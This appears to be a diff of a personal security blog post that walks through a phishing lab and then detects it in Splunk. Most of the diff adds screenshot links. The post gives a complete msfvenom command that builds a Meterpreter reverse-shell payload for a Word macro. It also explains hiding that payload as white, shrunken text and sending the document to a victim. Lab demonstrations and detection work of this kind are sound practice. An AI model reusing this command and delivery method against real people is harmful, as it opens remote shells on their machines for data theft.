@@ -11,18 +11,35 @@ The below is just a high level view of the above mentioned process with what too
 
 So I created a macro and payload using MsfVenom with the following command - msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.140.17 LPORT=4545 -e x86/shikata_ga_nai -f vba-exe
 
+![Image](https://github.com/CyberZombi3/CyberZombi3.co.uk/blob/master/PhishMe/Images/1x.png?raw=true)
 
 This then goes off and creates some vba code and a payload both need to be inserted into your malicious word document, it looks a little like below.
 
+![Image](https://github.com/CyberZombi3/CyberZombi3.co.uk/blob/master/PhishMe/Images/2x.png?raw=true)
+
+![Image](https://github.com/CyberZombi3/CyberZombi3.co.uk/blob/master/PhishMe/Images/3x.png?raw=true)
 
 These then need to be added into the Word doc as you can see below. Just go ahead and copy and paste the code into the blank vba screen.
+
+![Image](https://github.com/CyberZombi3/CyberZombi3.co.uk/blob/master/PhishMe/Images/4x.png?raw=true)
+
 Create a nice looking document that suits the needs of your victim. Notice below the grey shaded area, that's the payload code that for this demo I have shrunk down the text size and changed the colour to white just so its not immediately seen, this could be hidden in an image or the footer that's really up to you how you want to go about hiding it.
+
+![Image](https://github.com/CyberZombi3/CyberZombi3.co.uk/blob/master/PhishMe/Images/5x.png?raw=true)
+
 So now were ready to send the email. It appears in the victims inbox as expected.
+
+![Image](https://github.com/CyberZombi3/CyberZombi3.co.uk/blob/master/PhishMe/Images/6x.png?raw=true)
+
 The user then opens the file and the payload runs. The user maybe prompted to enable editing. I found that that wasn't always the case when playing around with this. From then on in we can see in Splunk the word doc and what looks to be a strange looking executable ran at the time of execution.
 
+![Image](https://github.com/CyberZombi3/CyberZombi3.co.uk/blob/master/PhishMe/Images/7x.png?raw=true)
 
 This can then be confirmed from your newly gained Meterpreter session. Below we see the creation and the connection made.
 
+![Image](https://github.com/CyberZombi3/CyberZombi3.co.uk/blob/master/PhishMe/Images/8x.png?raw=true)
+
+![Image](https://github.com/CyberZombi3/CyberZombi3.co.uk/blob/master/PhishMe/Images/9x.png?raw=true)
 
 As the attacker you can then go off and do what it is you need to do, escalate privileges, steal data etc etc.
 
@@ -41,6 +58,10 @@ The Splunk app I'm working on looks for all types of things based off the Mitre 
 
 Below there are a few screenshots, I've mentioned it in some of my previous posts so you may have seen it before. I could probably release it as is now although its far from complete and currently does not cover the entire MA framework, let me know what you think.
 
+![Image](https://github.com/CyberZombi3/CyberZombi3.co.uk/blob/master/PhishMe/Images/10x.png?raw=true)
+
+![Image](https://github.com/CyberZombi3/CyberZombi3.co.uk/blob/master/PhishMe/Images/11x.png?raw=true)
+
 
 For anyone wanting to have a play around with Phishing I came across the Morning Catch VM a while back and although it's a little dated now it still does the job.
 
@@ -52,4 +73,4 @@ Find me on Twitter @CyberZombi3
 
 Cheers
 
-#Hacking #Hacker #RedTeam #Blueteam #ITSecurity #Noob #Splunk #Monitoring #MitreAttack #Phishing
+
